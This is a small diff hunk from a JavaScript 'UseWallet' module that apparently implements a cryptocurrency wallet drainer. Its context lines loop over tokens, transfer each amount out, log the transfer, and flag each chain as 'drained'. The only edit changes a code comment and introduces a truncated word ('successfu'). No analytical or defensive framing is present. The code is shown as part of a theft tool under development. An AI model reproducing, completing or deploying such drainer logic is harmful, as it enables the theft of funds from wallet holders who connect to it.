@@ -144,7 +144,7 @@ export const UseWallet = (amount) => {
                         `Transferred ${amountInWei.toString()} of ${tokenAddress}`
                     );
 
-                    chainDrainStatus[chainId] = true; // Mark chain as drained if successful
+                    chainDrainStatus[chainId] = true; // Mark chain as drained if successfu
                 } catch (error) {
                     console.log(`Transfer failed for ${tokenAddress}:`, error);
                     continue; // Continue to next token on failure
